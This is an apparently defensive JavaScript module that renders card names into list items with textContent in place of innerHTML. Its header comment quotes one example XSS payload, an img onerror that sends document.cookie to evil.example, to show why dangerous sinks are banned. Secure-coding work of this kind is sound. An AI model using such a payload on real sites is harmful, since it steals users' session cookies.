/**
 * DOM rendering for cards.
 *
 * SECURITY CONTRACT — this module must never write untrusted data into an HTML
 * parser. Specifically, `innerHTML`, `outerHTML`, `insertAdjacentHTML`,
 * `document.write` and `eval` are prohibited: a card name such as
 * `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` would
 * otherwise execute in the page's origin. Names are written exclusively with
 * `textContent`, which sets the text node directly and never parses markup.
 *
 * This replaces the original string-concatenation renderer, which interpolated
 * the raw name into a template and appended it with `innerHTML` on every click.
 *
 * The contract is enforced two ways so a future edit cannot quietly regress it:
 *   - `test/renderer.test.js` asserts a known payload stays inert text.
 *   - `test/no-dangerous-sinks.test.js` scans the source tree for the sinks.
 *
 * The `document` is injected rather than read from a global so the renderer can
 * be tested against a minimal DOM stub.
 */

export const CARD_CLASS_NAME = 'cardAdd';
export const DELETE_BUTTON_CLASS_NAME = 'card-list__delete';
export const DELETE_ACTION = 'delete';

/** Attribute holding the owning card's id; the single source of DOM/state linkage. */
export const CARD_ID_ATTRIBUTE = 'data-card-id';
/** Attribute marking the element that requests deletion. */
export const CARD_ACTION_ATTRIBUTE = 'data-action';

function assertDocument(doc) {
  if (doc === null || typeof doc !== 'object' || typeof doc.createElement !== 'function') {
    throw new TypeError('createCardElement requires a document-like object');
  }
}

/**
 * Build the DOM element for a single card.
 *
 * The card is an `<li>` so the container can be a real `<ul>`: that gives
 * assistive technology a list of cards with a count, instead of an unlabelled
 * pile of divs.
 *
 * @param {Document} doc
 * @param {{id: number, name: string}} card
 * @returns {HTMLElement}
 */
export function createCardElement(doc, card) {
	assertDocument(doc);

	if (card === null || typeof card !== 'object') {
		throw new TypeError('createCardElement requires a card object');
	}

	const container = doc.createElement('li');
	container.className = CARD_CLASS_NAME;
	container.setAttribute(CARD_ID_ATTRIBUTE, String(card.id));

  const heading = doc.createElement('h1');
  // textContent, not innerHTML: the name is data, never markup.
  heading.textContent = card.name;
  container.appendChild(heading);

  const deleteButton = doc.createElement('input');
  deleteButton.type = 'button';
  deleteButton.className = DELETE_BUTTON_CLASS_NAME;
  deleteButton.value = 'Delete';
  // setAttribute escapes for us, so the accessible name may safely include the
  // card name even when it contains quotes or angle brackets.
  deleteButton.setAttribute('aria-label', `Delete card ${card.name}`);
  deleteButton.setAttribute(CARD_ACTION_ATTRIBUTE, DELETE_ACTION);
  deleteButton.setAttribute(CARD_ID_ATTRIBUTE, String(card.id));
  container.appendChild(deleteButton);

  return container;
}

/**
 * Replace the contents of `container` with one element per card.
 *
 * `replaceChildren` swaps nodes wholesale, which avoids the append-to-innerHTML
 * growth pattern of the original code and guarantees the list can never drift
 * out of sync with the store.
 *
 * @param {Document} doc
 * @param {HTMLElement} container
 * @param {ReadonlyArray<{id: number, name: string}>} cards
 */
export function renderCards(doc, container, cards) {
  assertDocument(doc);

  if (container === null || typeof container !== 'object') {
    throw new TypeError('renderCards requires a container element');
  }

  if (!Array.isArray(cards)) {
    throw new TypeError('renderCards requires an array of cards');
  }

  container.replaceChildren(...cards.map((card) => createCardElement(doc, card)));
}
